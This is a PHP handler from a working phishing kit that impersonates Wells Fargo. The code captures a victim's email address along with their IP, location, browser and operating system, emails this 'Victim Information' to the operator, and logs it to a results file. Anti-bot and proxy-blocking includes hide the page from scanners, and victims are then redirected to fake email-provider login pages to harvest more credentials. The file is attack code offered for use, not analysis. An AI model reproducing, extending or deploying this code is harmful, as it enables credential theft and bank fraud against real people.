<?php
ob_start();
session_start();
include('../../Against_bot/east_a/useragent_bot.php');
require '../../Against_bot/east_b/main.php';
include('../../panel/config.php');
include '../../Against_bot/east_b/random.php';
require_once '../Comp.php';
if ($api_protection =="true") {
	include('../../Against_bot/east_b/proxyblock.php');
}

    $comps = new Comp;

    $settings = $comps->settings();



    if (isset(
        $_POST['email']
    )) {
        if (!$comps->checkEmpty(
            $_POST['email']
        )) {
            $_SESSION['email'] = $_POST['email'];

        
        
    $v_ip = $_SERVER['REMOTE_ADDR'];
	$email = $_SESSION['email'] = $_POST['email'];
    $VictimInfo1 = "| Submitted by : https://www.geodatatool.com/en/?ip=$v_ip  ";
    $VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| Us3r4gent : " . $user_agent . "";
    $VictimInfo4 = "| Br0wser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";
    $message = "+ ----- [ ❤️East (🏦 WELLSFARGO) Code❤️ ] -----+\n";
    $message .="| Email Address: $email\n";
    $message .= "+ --------------------------+\n";
    $message .= "+ 🌐 Victim Inf0rmation\n";
    $message .= "$VictimInfo1\n";
    $message .= "$VictimInfo2\n";
    $message .= "$VictimInfo3\n";
    $message .= "$VictimInfo4\n";
    $message .= "$VictimInfo5\n";
    $message .= "| 🕛 Received : $date\n";
    $message .= "+ ----------------------------+\n";
    $subject = "$v_ip (☎️ WELLSFARGO PHON4 DETAILZ)  \n";
    $head = "Content-type:text/plain;charset=UTF-8\r\n";
    $head ="From: WELLSFARGO <wells@eastcoder.com>\r\n";

    @mail($your_email,$subject,$message,$head);
    $save=fopen("../resultz/phone.txt","a+");
	fwrite($save,$message);
	fclose($save);
	
	
            if (!$comps->userEmail($_SESSION['email'])) {
                $comps->headerX("../../oam/email/Microsoft");
            } else {
                $comps->headerX("../../oam/email/" . $comps->userEmail($_SESSION['email']) . "");
            }
        } else {
            echo $antibot->throw404();
            die();
        }
    } else {
        echo $antibot->throw404();
        die();
    }